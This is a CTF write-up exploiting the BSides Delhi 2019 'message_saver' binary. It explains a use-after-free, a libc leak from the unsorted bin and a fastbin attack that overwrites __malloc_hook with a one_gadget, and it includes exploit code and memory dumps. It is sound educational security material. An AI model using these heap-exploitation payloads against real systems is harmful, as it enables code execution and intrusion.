I"u⁄<p>BSides Delhi 2019 turned up with some amazing pwn challenges this year. I was only able to solve this one, but big props to the organizers and challenge authors for an amazing CTF!</p>

<p>This is a glibc 2.23 heap exploitation challenge. There is a UAF (use-after-free) vulnerability in the program. When messages are deleted, their corresponding pointers in the global array of messages are not NULL‚Äôd out.</p>

<p>I initially use the unsorted bin to leak the libc address of the unsorted bin in the main arena. I use this address to find the base address of libc, followed by the address of <code class="highlighter-rouge">__malloc_hook</code> as well as the address of my one gadget. After that, it‚Äôs essentially just a fastbin attack to get a chunk on top of <code class="highlighter-rouge">__malloc_hook</code> and overwrite it with the one gadget‚Äôs address.</p>

<p>Honestly, the UAF makes this challenge extremely easy. I‚Äôm surprised more people didn‚Äôt solve it.</p>

<h3 id="challenge"><strong>Challenge</strong></h3>

<ul>
  <li><strong>Category:</strong> pwn</li>
  <li><strong>Points:</strong> 919</li>
  <li><strong>Solves:</strong> 16</li>
</ul>

<blockquote>
  <p>Discription: Here comes a new and improved free message saving service.</p>

  <p>nc 35.226.111.216 4444</p>

  <p>Author: <a href="https://twitter.com/3agl31">3agl31</a></p>

  <p>Link: <a href="https://drive.google.com/file/d/1jXDymZ5PYoVzbJZUk02MQJXIuc1d7pQm/view?usp=sharing">message_saver</a></p>
</blockquote>

<h3 id="solution"><strong>Solution</strong></h3>

<h4 id="reverse-engineering-the-binary">Reverse engineering the binary</h4>

<p>The binary has the following characteristics:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-rev/bsides_delhi2019/message_saver<span class="nv">$ </span>file message_saver
message_saver: ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/l, BuildID[sha1]<span class="o">=</span>008f02f75788e02e0e6087e395b30d99a624dda1, <span class="k">for </span>GNU/Linux 3.2.0, not stripped

vagrant@ubuntu-bionic:/ctf/pwn-and-rev/bsides_delhi2019/message_saver<span class="nv">$ </span>checksec message_saver
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-rev/bsides_delhi2019/message_saver/message_saver'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></div></div>

<p>It‚Äôs a non-stripped x64 binary with all protections enabled. The fact that it is non-stripped makes it very easy to disassemble it. It poses as a ‚Äúmessage saving service‚Äù, where messages are stored in a global array of pointers. There is a limit of 9 messages imposed on the program. The functionality is as follows.</p>

<p>The <code class="highlighter-rouge">add</code> function will first call <code class="highlighter-rouge">malloc(0x28)</code> to allocate a chunk to store the topic of the message. The first 24 bytes of this chunk stores the topic of the message.The next 8 bytes will store the address of the body of the message. The next 8 bytes will store the size of the body of the message. The body is a chunk that is malloc‚Äôd by the user, and it must be between 0x0 and 0x3e8 bytes (inclusive) in size.</p>

<p>An allocated message looks like the following:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">‚û§</span>  <span class="n">x</span><span class="o">/</span><span class="mi">100</span><span class="n">gx</span> <span class="mh">0x0000555555559000</span>
<span class="mh">0x555555559000</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span> <span class="o">&lt;-</span> <span class="n">topic</span> <span class="n">chunk</span>
<span class="mh">0x555555559010</span><span class="o">:</span> <span class="mh">0x4141414141414141</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x555555559020</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000555555559040</span> <span class="o">&lt;-</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">body</span>
<span class="mh">0x555555559030</span><span class="o">:</span> <span class="mh">0x0000000000000032</span>      <span class="mh">0x0000000000000041</span> <span class="o">&lt;-</span> <span class="n">body</span> <span class="n">chunk</span>
<span class="mh">0x555555559040</span><span class="o">:</span> <span class="mh">0x4242424242424242</span>      <span class="mh">0x4242424242424242</span> <span class="o">&lt;-</span> <span class="n">text</span> <span class="n">of</span> <span class="n">the</span> <span class="n">body</span>
<span class="mh">0x555555559050</span><span class="o">:</span> <span class="mh">0x4242424242424242</span>      <span class="mh">0x4242424242424242</span>
<span class="mh">0x555555559060</span><span class="o">:</span> <span class="mh">0x4242424242424242</span>      <span class="mh">0x0042424242424242</span>
<span class="mh">0x555555559070</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000020f91</span> <span class="o">&lt;-</span> <span class="n">top</span> <span class="n">chunk</span>
<span class="mh">0x555555559080</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
</code></pre></div></div>

<p>The <code class="highlighter-rouge">edit</code> function will just edit a message‚Äôs topic and body (in that order). No heap overflows or anything here, so it‚Äôs a pretty uninteresting function.</p>

<p>The <code class="highlighter-rouge">delete</code> function will free a message‚Äôs topic and body, but it will not <code class="highlighter-rouge">NULL</code> out the message‚Äôs pointer that is stored in the global <code class="highlighter-rouge">messages</code> array. This creates a UAF situation which we will use in the exploit.</p>

<p>The <code class="highlighter-rouge">view</code> function simply prints out a message‚Äôs topic followed by its body.</p>

<h4 id="step-1-unsorted-bin-leak">Step 1: <strong>Unsorted bin leak</strong></h4>

<p>An info leak is extremely easy in glibc 2.23 (due to the absence of the tcache) with a UAF vulnerability. All we have to do is free a small sized chunk and read its FD pointer.</p>

<p>I initially start out by setting up 4 messages (note that the topic does not matter, only the body‚Äôs size matters):</p>
<ol>
  <li><strong>Chunk A (size 0x80 bytes)</strong> will be our small sized chunk. It will be used to leak the libc address of the unsorted bin in the main arena.</li>
  <li><strong>Chunk B (size 0x68 bytes)</strong> will be used for the fastbin attack. It must be this size to bypass a check that is described below.</li>
  <li><strong>Chunk C (size 0x68 bytes)</strong> will be used for the fastbin attack. It must be this size to bypass a check that is described below.</li>
  <li><strong>Chunk D (size 0x50 bytes)</strong> is not used. It is only there to prevent the previous chunks from coalescing with the top chunk when freed.</li>
</ol>

<p>After that, I simply free chunk A. Since it is a small sized chunk, a libc pointer is placed in it‚Äôs <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> fields, as shown below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">‚û§</span>  <span class="n">x</span><span class="o">/</span><span class="mi">100</span><span class="n">gx</span> <span class="mh">0x0000560b07fb2000</span>
<span class="mh">0x560b07fb2000</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">A</span> <span class="n">topic</span>
<span class="mh">0x560b07fb2010</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">topic</span> <span class="n">is</span> <span class="n">fastbin</span> <span class="n">sized</span><span class="p">,</span> <span class="n">so</span> <span class="n">FD</span> <span class="n">is</span> <span class="n">empty</span> <span class="n">after</span> <span class="n">free</span>
<span class="mh">0x560b07fb2020</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000560b07fb2040</span> <span class="o">&lt;-</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">body</span>
<span class="mh">0x560b07fb2030</span><span class="o">:</span> <span class="mh">0x0000000000000082</span>      <span class="mh">0x0000000000000091</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">A</span> <span class="n">body</span>
<span class="mh">0x560b07fb2040</span><span class="o">:</span> <span class="mh">0x00007f150ec23b78</span>      <span class="mh">0x00007f150ec23b78</span> <span class="o">&lt;-</span> <span class="n">body</span> <span class="n">FD</span> <span class="n">and</span> <span class="n">BK</span> <span class="n">have</span> <span class="n">libc</span> <span class="n">pointers</span> <span class="n">in</span> <span class="n">them</span>
<span class="mh">0x560b07fb2050</span><span class="o">:</span> <span class="mh">0x4141414141414141</span>      <span class="mh">0x4141414141414141</span> <span class="o">&lt;-</span> <span class="n">rest</span> <span class="n">of</span> <span class="n">chunk</span> <span class="n">A</span> <span class="n">body</span>
<span class="mh">0x560b07fb2060</span><span class="o">:</span> <span class="mh">0x4141414141414141</span>      <span class="mh">0x4141414141414141</span>
<span class="p">...</span>
</code></pre></div></div>

<p>Since we have a UAF, we can get the leak as follows:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' : '</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
</code></pre></div></div>

<h4 id="step-2-fast-bin-attack">Step 2: <strong>Fast bin attack</strong></h4>

<p>Now that we have a leak, we need to get a chunk on top of <code class="highlighter-rouge">__malloc_hook</code> so we can overwrite it with a one gadget. We will do this by doing what is known as a fastbin attack.</p>

<p>When fastbin sized chunks are freed, they get stored in a singly stored linked list known as a fastbin. The way each free chunk keeps track of itself in the list is by setting aside the first 8 bytes of the chunk (in a 64-bit system) for what is called the <code class="highlighter-rouge">fd</code> pointer, which is essentially a pointer to the next free chunk in this linked list. This is demonstrated below using chunks B and C from our exploit. Note that chunk B was freed first, followed by chunk C:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">‚û§</span>  <span class="n">x</span><span class="o">/</span><span class="mi">300</span><span class="n">gx</span> <span class="mh">0x00005564e50e9000</span>
<span class="mh">0x5564e50e9000</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">A</span> <span class="n">topic</span> <span class="p">(</span><span class="n">free</span><span class="p">)</span>
<span class="mh">0x5564e50e9010</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">A</span> <span class="n">fd</span> <span class="n">is</span> <span class="n">empty</span> <span class="n">as</span> <span class="n">it</span> <span class="n">is</span> <span class="n">the</span> <span class="n">first</span> <span class="n">free</span> <span class="n">chunk</span> <span class="n">in</span> <span class="n">the</span> <span class="mh">0x28</span> <span class="n">fastbin</span>
<span class="mh">0x5564e50e9020</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x00005564e50e9040</span> <span class="o">&lt;-</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">chunk</span> <span class="n">A</span> <span class="n">body</span>
<span class="mh">0x5564e50e9030</span><span class="o">:</span> <span class="mh">0x0000000000000082</span>      <span class="mh">0x0000000000000091</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">A</span> <span class="n">body</span> <span class="p">(</span><span class="n">free</span><span class="p">)</span> <span class="n">in</span> <span class="n">the</span> <span class="n">unsorted</span> <span class="n">bin</span>
<span class="mh">0x5564e50e9040</span><span class="o">:</span> <span class="mh">0x00007f998eadfb78</span>      <span class="mh">0x00007f998eadfb78</span> <span class="o">&lt;-</span> <span class="n">libc</span> <span class="n">pointers</span>
<span class="mh">0x5564e50e9050</span><span class="o">:</span> <span class="mh">0x4141414141414141</span>      <span class="mh">0x4141414141414141</span>
<span class="p">...</span>
<span class="mh">0x5564e50e90c0</span><span class="o">:</span> <span class="mh">0x0000000000000090</span>      <span class="mh">0x0000000000000030</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">B</span> <span class="n">topic</span> <span class="p">(</span><span class="n">free</span><span class="p">)</span>
<span class="mh">0x5564e50e90d0</span><span class="o">:</span> <span class="mh">0x00005564e50e9000</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">B</span> <span class="n">fd</span> <span class="n">points</span> <span class="n">to</span> <span class="n">chunk</span> <span class="n">A</span> <span class="n">topic</span> <span class="n">in</span> <span class="n">the</span> <span class="mh">0x28</span> <span class="n">fastbin</span>
<span class="mh">0x5564e50e90e0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x00005564e50e9100</span> <span class="o">&lt;-</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">chunk</span> <span class="n">B</span> <span class="n">body</span>
<span class="mh">0x5564e50e90f0</span><span class="o">:</span> <span class="mh">0x0000000000000068</span>      <span class="mh">0x0000000000000071</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">B</span> <span class="n">body</span>
<span class="mh">0x5564e50e9100</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x4242424242424242</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">B</span> <span class="n">body</span> <span class="n">fd</span> <span class="n">is</span> <span class="n">empty</span> <span class="n">as</span> <span class="n">it</span> <span class="n">is</span> <span class="n">the</span> <span class="n">first</span> <span class="n">free</span> <span class="n">chunk</span> <span class="n">in</span> <span class="n">the</span> <span class="mh">0x68</span> <span class="n">fastbin</span>
<span class="mh">0x5564e50e9110</span><span class="o">:</span> <span class="mh">0x4242424242424242</span>      <span class="mh">0x4242424242424242</span>
<span class="p">...</span>
<span class="mh">0x5564e50e9160</span><span class="o">:</span> <span class="mh">0x0000424242424242</span>      <span class="mh">0x0000000000000031</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">C</span> <span class="n">topic</span> <span class="p">(</span><span class="n">free</span><span class="p">)</span>
<span class="mh">0x5564e50e9170</span><span class="o">:</span> <span class="mh">0x00005564e50e90c0</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">C</span> <span class="n">fd</span> <span class="n">points</span> <span class="n">to</span> <span class="n">chunk</span> <span class="n">B</span> <span class="n">topic</span> <span class="n">in</span> <span class="n">the</span> <span class="mh">0x28</span> <span class="n">fastbin</span>
<span class="mh">0x5564e50e9180</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x00005564e50e91a0</span> <span class="o">&lt;-</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">chunk</span> <span class="n">C</span> <span class="n">body</span>
<span class="mh">0x5564e50e9190</span><span class="o">:</span> <span class="mh">0x0000000000000068</span>      <span class="mh">0x0000000000000071</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">C</span> <span class="n">body</span>
<span class="mh">0x5564e50e91a0</span><span class="o">:</span> <span class="mh">0x00005564e50e90f0</span>      <span class="mh">0x4343434343434343</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">C</span> <span class="n">body</span> <span class="n">fd</span> <span class="n">points</span> <span class="n">to</span> <span class="n">chunk</span> <span class="n">B</span> <span class="n">body</span> <span class="n">in</span> <span class="n">the</span> <span class="mh">0x68</span> <span class="n">fastbin</span>
<span class="mh">0x5564e50e91b0</span><span class="o">:</span> <span class="mh">0x4343434343434343</span>      <span class="mh">0x4343434343434343</span>
<span class="p">...</span>
<span class="mh">0x5564e50e9200</span><span class="o">:</span> <span class="mh">0x0000434343434343</span>      <span class="mh">0x0000000000000031</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">D</span> <span class="n">topic</span> <span class="p">(</span><span class="n">to</span> <span class="n">prevent</span> <span class="n">coalescing</span> <span class="n">with</span> <span class="n">the</span> <span class="n">top</span> <span class="n">chunk</span><span class="p">)</span>
<span class="mh">0x5564e50e9210</span><span class="o">:</span> <span class="mh">0x4444444444444444</span>      <span class="mh">0x0000000000000000</span>
</code></pre></div></div>

<p>Now, what happens if we allocate space for a new message where the body size of the message is 0x68 bytes?</p>

<ol>
  <li>We will get chunk C given back to us from the 0x68 fastbin</li>
  <li>The pointer in the <code class="highlighter-rouge">fd</code> of chunk C will be placed at the front of that fastbin</li>
  <li>A subsequent malloc will then give us a chunk wherever that <code class="highlighter-rouge">fd</code> pointer was pointing to</li>
</ol>

<p>Knowing this, we can trick malloc. Given that we have a UAF vulnerability, we can overwrite this <code class="highlighter-rouge">fd</code> pointer with a pointer of our choosing. This pointer can be arbitrary, barring some restrictions, as shown by <a href="https://github.com/mistydemeo/super_nes_classic_edition_oss/blob/master/glibc-2.23/glibc-2.23/malloc/malloc.c#L3383">this check</a> in <code class="highlighter-rouge">malloc.c</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fastbin_index</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">))</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
<span class="p">{</span>
    <span class="n">errstr</span> <span class="o">=</span> <span class="s">"malloc(): memory corruption (fast)"</span><span class="p">;</span>
<span class="nl">errout:</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="n">errstr</span><span class="p">,</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">),</span> <span class="n">av</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Basically, the pointer that we overwrite <code class="highlighter-rouge">fd</code> with must point to a memory region that ‚Äúlooks‚Äù like a chunk with a size that will fit in this specific fastbin. Otherwise, we will get the <code class="highlighter-rouge">"malloc(): memory corruption (fast)"</code> error.</p>

<p>To elaborate, the pointer must point to a memory region that looks like a chunk where the chunk size must be between 0x70 - 0x7f. Chunk C is a good example:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x5564e50e9190</span><span class="o">:</span> <span class="mh">0x0000000000000068</span>      <span class="mh">0x0000000000000071</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">C</span> <span class="n">body</span> <span class="n">chunksize</span>
</code></pre></div></div>

<p>If we take a look at <code class="highlighter-rouge">__malloc_hook</code> in memory, we will see the following:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">‚û§</span>  <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span> <span class="mh">0x7f6c4122aae0</span>
<span class="mh">0x7f6c4122aae0</span> <span class="o">&lt;</span><span class="n">_IO_wide_data_0</span><span class="o">+</span><span class="mi">288</span><span class="o">&gt;:</span>   <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">not</span> <span class="n">valid</span> <span class="p">(</span><span class="n">chunksize</span> <span class="mi">0</span><span class="p">)</span>
<span class="mh">0x7f6c4122aaf0</span> <span class="o">&lt;</span><span class="n">_IO_wide_data_0</span><span class="o">+</span><span class="mi">304</span><span class="o">&gt;:</span>   <span class="mh">0x00007f6c41229260</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">not</span> <span class="n">valid</span> <span class="p">(</span><span class="n">chunksize</span> <span class="mi">0</span><span class="p">)</span>
<span class="mh">0x7f6c4122ab00</span> <span class="o">&lt;</span><span class="n">__memalign_hook</span><span class="o">&gt;:</span>       <span class="mh">0x00007f6c40eebe20</span>      <span class="mh">0x00007f6c40eeba00</span> <span class="o">&lt;-</span> <span class="n">not</span> <span class="n">valid</span> <span class="p">(</span><span class="mh">0x7f6c49eeba00</span> <span class="n">is</span> <span class="n">too</span> <span class="n">large</span><span class="o">!</span><span class="p">)</span>
<span class="mh">0x7f6c4122ab10</span> <span class="o">&lt;</span><span class="n">__malloc_hook</span><span class="o">&gt;:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">not</span> <span class="n">valid</span> <span class="p">(</span><span class="n">chunksize</span> <span class="mi">0</span><span class="p">)</span>
<span class="mh">0x7f6c4122ab20</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">&gt;:</span>    <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">not</span> <span class="n">valid</span> <span class="p">(</span><span class="n">chunksize</span> <span class="mi">0</span><span class="p">)</span>
<span class="p">...</span>
</code></pre></div></div>

<p>We see that there isn‚Äôt a valid memory region near <code class="highlighter-rouge">__malloc_hook</code>. However, note that the security check above does not ensure that the memory address is 16 byte aligned, so what happens if we instead view the memory region of <code class="highlighter-rouge">__malloc_hook - 0x30 + 0xd</code>?</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">‚û§</span>  <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span> <span class="mh">0x7f6c4122ab10</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="mh">0xd</span>
<span class="mh">0x7f6c4122aaed</span> <span class="o">&lt;</span><span class="n">_IO_wide_data_0</span><span class="o">+</span><span class="mi">301</span><span class="o">&gt;:</span>   <span class="mh">0x6c41229260000000</span>      <span class="mh">0x000000000000007f</span> <span class="o">&lt;-</span> <span class="n">looks</span> <span class="n">like</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">chunk</span><span class="o">!</span> <span class="p">(</span><span class="n">chunksize</span> <span class="mh">0x7f</span><span class="p">)</span>
<span class="mh">0x7f6c4122aafd</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x6c40eeba00000000</span>
<span class="mh">0x7f6c4122ab0d</span> <span class="o">&lt;</span><span class="n">__realloc_hook</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;:</span>      <span class="mh">0x000000000000007f</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x7f6c4122ab1d</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x7f6c4122ab2d</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;:</span> <span class="mh">0x352e4f3160000000</span>      <span class="mh">0x0000000000000056</span>
<span class="mh">0x7f6c4122ab3d</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="p">...</span>
</code></pre></div></div>

<p>Sure, the addresses are labeled weirdly now, but we can see that this is a valid address (0x7f6c4122aaed) that we can point to!</p>

<p>Using our leak from before, we can now calculate the addresses of the things we need:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' : '</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># Calculate offsets
</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="mh">0xd</span>
<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xf02a4</span> <span class="c1"># Use david942j's one_gadget tool
</span></code></pre></div></div>

<p>Now, in order to do the fastbin attack, we just overwrite chunk C‚Äôs body‚Äôs <code class="highlighter-rouge">fd</code> pointer with the address to <code class="highlighter-rouge">__malloc_hook - 0x30 + 0xd</code>. <strong><em>However</em></strong>, in order to do that, we will be overwriting chunk C‚Äôs topic‚Äôs <code class="highlighter-rouge">fd</code> pointer as well (due to how the <code class="highlighter-rouge">edit</code> function works). We need to keep this a valid pointer, as otherwise when we allocate a chunk again, an invalid <code class="highlighter-rouge">fd</code> pointer will crash our program.</p>

<p>Since we have a UAF, we can easily just read the current <code class="highlighter-rouge">fd</code> pointer that chunk C‚Äôs topic has, and reuse it when we overwrite chunk C‚Äôs body‚Äôs <code class="highlighter-rouge">fd</code> pointer to <code class="highlighter-rouge">__malloc_hook - 0x30 + 0xd</code>, as follows:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># We must have a valid pointer at the fd of the topic chunk, otherwise the program will crash
# So we initially read the fd pointer and store it
</span><span class="n">topic_fd</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' : '</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># Now overwrite the fd pointer of chunk C's body to __malloc_hook-0x30+0xd
# Ensure not to change chunk C's topic's fd pointer
</span><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">topic_fd</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
</code></pre></div></div>

<p>Now we simply perform two mallocs. The first malloc gives us back chunk C and puts the pointer pointing to <code class="highlighter-rouge">__malloc_hook - 0x30 + 0xd</code> at the front of the 0x68 fastbin. The second malloc subsequently gives us a chunk right on top of <code class="highlighter-rouge">__malloc_hook - 0x30 + 0xd</code>. Now we just have to pad our input enough to overwrite <code class="highlighter-rouge">__malloc_hook</code> with a one gadget, as follows:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Second allocation will be at __malloc_hook-0x30+0xd
# Overwrite __malloc_hook with one_gadget
</span><span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'E'</span><span class="o">*</span><span class="mh">0x8</span><span class="p">,</span> <span class="s">'E'</span><span class="o">*</span><span class="mh">0x66</span><span class="p">)</span> <span class="c1"># Chunk C given back to us
</span><span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s">'F'</span><span class="o">*</span><span class="mh">0x8</span><span class="p">,</span> <span class="s">'F'</span><span class="o">*</span><span class="mh">0x13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span> <span class="o">+</span> <span class="s">'F'</span><span class="o">*</span><span class="mh">0x4b</span><span class="p">)</span> <span class="c1"># Chunk on __malloc_hook - 0x30 + 0xd
</span></code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">‚û§</span>  <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span> <span class="mh">0x7f0633c26aed</span> <span class="o">-</span> <span class="mh">0xd</span>
<span class="mh">0x7f0633c26ae0</span> <span class="o">&lt;</span><span class="n">_IO_wide_data_0</span><span class="o">+</span><span class="mi">288</span><span class="o">&gt;:</span>   <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x7f0633c26af0</span> <span class="o">&lt;</span><span class="n">_IO_wide_data_0</span><span class="o">+</span><span class="mi">304</span><span class="o">&gt;:</span>   <span class="mh">0x00007f0633c25260</span>      <span class="mh">0x4646460000000000</span>
<span class="mh">0x7f0633c26b00</span> <span class="o">&lt;</span><span class="n">__memalign_hook</span><span class="o">&gt;:</span>       <span class="mh">0x4646464646464646</span>      <span class="mh">0x4646464646464646</span>
<span class="mh">0x7f0633c26b10</span> <span class="o">&lt;</span><span class="n">__malloc_hook</span><span class="o">&gt;:</span> <span class="mh">0x00007f06339522a4</span>      <span class="mh">0x4646464646464646</span> <span class="o">&lt;-</span> <span class="n">__malloc_hook</span> <span class="n">overwritten</span> <span class="n">with</span> <span class="n">one</span> <span class="n">gadget</span>
<span class="mh">0x7f0633c26b20</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">&gt;:</span>    <span class="mh">0x4646464646464646</span>      <span class="mh">0x4646464646464646</span>
<span class="p">...</span>
</code></pre></div></div>

<p>And finally, we just need to call <code class="highlighter-rouge">malloc</code> one more time to get a shell.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Get shell
</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
